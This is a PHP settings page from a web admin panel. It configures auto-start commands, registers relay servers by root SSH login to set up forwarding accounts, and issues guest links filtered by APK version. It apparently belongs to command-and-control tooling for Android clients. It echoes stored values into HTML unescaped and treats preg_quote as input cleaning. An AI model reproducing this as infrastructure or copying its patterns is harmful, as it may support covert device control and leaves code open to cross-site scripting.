<?php
session_start();
require_once 'includes/auth_validate.php';
require_once './config/config.php';
require_once 'lib/Net/SSH2.php';
require_once 'lib/geoip.inc';
require_once 'includes/func.php';

$gi = geoip_open("lib/GeoIP.dat",GEOIP_STANDARD);

//serve POST method, After successful insert, redirect to commands.php page.
if ($_SERVER['REQUEST_METHOD'] == 'POST'){
    if ($_POST['settings']) {
        $json = $_POST['settings'];
        $settings_arr = json_decode($json);
        $settings_arr_cln = array();

        // cleanup input data from any evil
        foreach ($settings_arr as $blk => $blk_param) {
            $blk = preg_quote($blk);
            $settings_arr_cln[$blk] = array();
            foreach ($blk_param as $command => $params) {
                $cmd = preg_quote($command);
                $settings_arr_cln[$blk][$cmd] = array();
                foreach ($params as $param => $value) {
                    $settings_arr_cln[$blk][$cmd][preg_quote($param)] = preg_quote($value);
                }
            }
        }

        $json = json_encode($settings_arr_cln, JSON_PRETTY_PRINT);
        $status = file_put_contents("config/settings.json", $json);
    }
    if ($_POST['add_proxy_server']){
        $json = $_POST['add_proxy_server'];
        $settings_arr = json_decode($json);

        if (isset($settings_arr->address) and ($settings_arr->address != '')) {$address = preg_replace('/[;:^\'"]/', '',$settings_arr->address);} else {return;}
        if (isset($settings_arr->user) and ($settings_arr->user != '')) {$user = preg_replace('/[;:^\'"]/', '',$settings_arr->user);} else {return;}
        if (isset($settings_arr->pass) and ($settings_arr->pass != '')) {$pass = preg_replace('/[;:^\'"]/', '',$settings_arr->pass);} else {return;}
        if (isset($settings_arr->note)) {$note = preg_quote($settings_arr->note);}

        # check country
        $country = strtolower(geoip_country_code_by_addr($gi,$address));
        # prepare server
        $srv = prepare_srv_fwd($address, $user, $pass);
        if ($srv["status"] == "OK") {
            $srv_status = '1';
            $fwd_user = $srv["fwd_user"];
            $fwd_pass = $srv["fwd_pass"];
            $srv_status_text = "Ready for work";
        } else {
            $srv_status_text = $srv["status_text"];
            $srv_status = '0';
        }

        $data = Array ("ip" => $address,
            "user" => $user,
            "pass" => cryptString($pass),
            "forward_user" => $fwd_user,
            "forward_pass" => $fwd_pass,
            "root" => 1,
            "time" => time(),
            "country" => $country,
            "note" => $note,
            "status" => $srv_status,
            "status_text" => $srv_status_text
        );
        $status = $db->insert('proxy_servers', $data);
    }

    if ($_POST['add_new_guest']){
        $json = $_POST['add_new_guest'];
        $settings_arr = json_decode($json);

        if (isset($settings_arr->guest) and ($settings_arr->guest != '')) {$guest = preg_replace('/[;:^\'"]/', '',$settings_arr->guest);} else {return;}
        if (isset($settings_arr->filter) and ($settings_arr->filter != '')) {$filter = preg_replace('/[;:^\'"]/', '',$settings_arr->filter);} else {return;}

        $secret = generateRandomString(25);
        $origin = $_SERVER['HTTP_ORIGIN'];
        $link = "$origin/guest.php?i=$secret";
        # prepare
        $data = Array ("name" => $guest,
            "filter" => $filter,
            "secret" => $secret,
            "link" => $link
        );
        $status = $db->insert('guests', $data);
    }


    if($status) {
        $_SESSION['success'] = "Settings has been saved successfully!";
        //header('location: settings.php');
        exit();
    }
}


include_once 'includes/header.php';
?>
<?php
$commands = file_get_contents("config/commands.json");
$settings = file_get_contents("config/settings.json");
$commands = json_decode($commands, TRUE);
$settings = json_decode($settings, TRUE);
?>
<div id="page-wrapper">
    <div class="row">

        <div class="col-lg-6">
            <h1 class="page-header">Auto start</h1>
        </div>
        <div class="col-lg-6" style="">
            <div class="page-action-links text-right">
                <button class="btn btn-success" onclick="saveSettings()" style="margin-right: 8px;"><span class="glyphicon glyphicon-ok"></span> Save settings </button>
                <!--<button class="btn btn-danger delete_btn" onclick="" style="margin-right: 8px;"><span class="glyphicon glyphicon-trash"></span> Disable all </button>-->
            </div>
        </div>
    </div>
    <?php include('./includes/flash_messages.php') ?>
    <!--    Begin filter section-->
    <?php
        foreach ($commands as $key => $value) {?>
    <div class="panel panel-settings">
        <div class="panel-body">
            <div class="form-check">
                <input type="checkbox" class="form-check-input" id="chk_start_<?php echo $key; ?>" value="<?php echo $key; ?>" <?php if (array_key_exists($key, $settings['start'])) echo "checked"?>>
                <label class="form-check-label" for="chk_start_<?php echo $key; ?>"><?php echo $key; ?></label>

                <?php
                    foreach ($value as $param => $description) {
                        $value = '';
                        if ($settings['start'][$key][$param]) $value = $settings['start'][$key][$param];
                        echo '<div class="form-group">
                        <label for="'.$key.$param.'">'.$param.'</label>
                            <input value="'.$value.'" placeholder="'.$description.'" name="'.$param.'" class="form-control" id="'.$key.'">
                    </div>';
                    }
                ?>
            </div>
        </div>
    </div>
    <?php } ?>
    <div class="row"></div>
    <div class="row">
        <div class="col-lg-6">
            <h1 class="page-header">Proxy servers</h1>
        </div>
    </div>
    <!--    Begin filter section-->
    <div class="well text-center filter-form">
        <!--<form class="form form-inline" action="">-->
            <label for="ip_add">ip</label>
            <input type="text" id="ip_add" name="ip_add" placeholder="ip of new server" value="">

            <label for="login_add">login</label>
            <input type="text" id="login_add" name="login_add" placeholder="login..." value="">
            <label for="pass_add">pass</label>
            <input type="text" id="pass_add" name="pass_add" placeholder="pass..." value="">
            <label for="note_add">note</label>
            <input type="text" id="note_add" name="note_add" placeholder="some notes..." value="">


            <button type="submit" class="btn btn-success" onclick="addProxyServer()"><span class="glyphicon glyphicon-plus"></span> Add server</button>
        <!-- </form> -->
    </div>
    <!--   Filter section end-->

    <!-- proxy servers -->

    <?php
    // select the columns
    $select = array('id', 'ip', 'country', 'forward_user', 'time', 'note', 'status');
    $p_servers = $db->get('proxy_servers');
    ?>

    <table class="table table-striped table-bordered table-condensed">
        <thead>
        <tr>
            <th>id</th>
            <th>IP</th>
            <th>Country</th>
            <th>fwd user</th>
            <th>fwd pass</th>
            <th>Add date</th>
            <th>Note</th>
            <th>Status</th>
            <th>Actions</th>
        </tr>
        </thead>
        <tbody>
        <?php
        foreach ($p_servers as $row) { ?>
            <tr>
                <td><?php echo $row['id'] ?></td>
                <td><?php echo $row['ip'] ?></td>
                <td><?php echo $row['country'] ?> </td>
                <td><?php echo $row['forward_user'] ?></td>
                <td><?php echo $row['forward_pass'] ?></td>
                <td><?php echo date("Y-m-d H:i",$row['time']) ?></td>
                <td><?php echo $row['note'] ?></span></td>
                <td><i class="glyphicon glyphicon-sort" aria-hidden="true" <?php if ($row['status']) {echo 'style="color:#5bb85c;"';} else {echo 'style="color:#d43f3a;"';}?>></i></td>
                <td>
                    <a href="edit_pserver.php?server_id=<?php echo $row['id'] ?>&operation=edit" class="btn btn-primary" style="margin-right: 8px;"><span class="glyphicon glyphicon-edit"></span>
                    <a href="" class="btn btn-danger delete_btn" data-toggle="modal" data-target="#confirm-delete-<?php echo $row['id'] ?>" style="margin-right: 8px;"><span class="glyphicon glyphicon-trash"></span></td>
            </tr>

            <!-- Delete Confirmation Modal-->
            <div class="modal fade" id="confirm-delete-<?php echo $row['id'] ?>" role="dialog">
                <div class="modal-dialog">
                    <form action="delete_pserver.php" method="POST">
                        <!-- Modal content-->
                        <div class="modal-content">
                            <div class="modal-header">
                                <button type="button" class="close" data-dismiss="modal">&times;</button>
                                <h4 class="modal-title">Confirm</h4>
                            </div>
                            <div class="modal-body">

                                <input type="hidden" name="del_id" id="del_id" value="<?php echo $row['id'] ?>">

                                <p>Are you sure you want to delete this server?</p>
                            </div>
                            <div class="modal-footer">
                                <button type="submit" class="btn btn-default pull-left">Yes</button>
                                <button type="button" class="btn btn-default" data-dismiss="modal">No</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        <?php } ?>
        </tbody>
    </table>


    <!-- begin guests section  -->
    <div class="row">
        <div class="col-lg-6">
            <h1 class="page-header">Guests</h1>
        </div>
    </div>
    <!--    Begin filter section-->
    <div class="well text-center filter-form">
        <!--<form class="form form-inline" action="">-->
        <label for="guest_name_add">Name</label>
        <input type="text" id="guest_name_add" name="guest_name_add" placeholder="Name for new guests" value="">

        <label for="filter_add">Filter</label>
        <input type="text" id="filter_add" name="filter_add" placeholder="filter for apk version" value="">


        <button type="submit" class="btn btn-success" onclick="addNewGuest()"><span class="glyphicon glyphicon-plus"></span> Add guest</button>
        <!-- </form> -->
    </div>
    <!--   Filter section end-->

    <!-- proxy servers -->

    <?php
    // select the columns
    $select = array('id', 'name', 'filter', 'secret', 'link');
    $p_servers = $db->get('guests');
    ?>

    <table class="table table-striped table-bordered table-condensed">
        <thead>
        <tr>
            <th>id</th>
            <th>Name</th>
            <th>Filter</th>
            <th>Secret</th>
            <th>Link</th>
            <th>Actions</th>
        </tr>
        </thead>
        <tbody>
        <?php
        foreach ($p_servers as $row) { ?>
            <tr>
                <td><?php echo $row['id'] ?></td>
                <td><?php echo $row['name'] ?></td>
                <td><?php echo $row['filter'] ?> </td>
                <td><?php echo $row['secret'] ?></td>
                <td><a href="<?php echo $row['link'] ?>"><?php echo $row['link'] ?></a></td>
                <td>
                    <a href="" class="btn btn-danger delete_btn" data-toggle="modal" data-target="#confirm-delete-<?php echo $row['id'] ?>" style="margin-right: 8px;"><span class="glyphicon glyphicon-trash"></span>
                </td>
            </tr>

            <!-- Delete Confirmation Modal-->
            <div class="modal fade" id="confirm-delete-<?php echo $row['id'] ?>" role="dialog">
                <div class="modal-dialog">
                    <form action="delete_guest.php" method="POST">
                        <!-- Modal content-->
                        <div class="modal-content">
                            <div class="modal-header">
                                <button type="button" class="close" data-dismiss="modal">&times;</button>
                                <h4 class="modal-title">Confirm</h4>
                            </div>
                            <div class="modal-body">

                                <input type="hidden" name="del_id" id="del_id" value="<?php echo $row['id'] ?>">

                                <p>Are you sure you want to delete this пгуые?</p>
                            </div>
                            <div class="modal-footer">
                                <button type="submit" class="btn btn-default pull-left">Yes</button>
                                <button type="button" class="btn btn-default" data-dismiss="modal">No</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        <?php } ?>
        </tbody>
    </table>
</div>

<!--Main container end-->


<?php include_once './includes/footer.php'; ?>

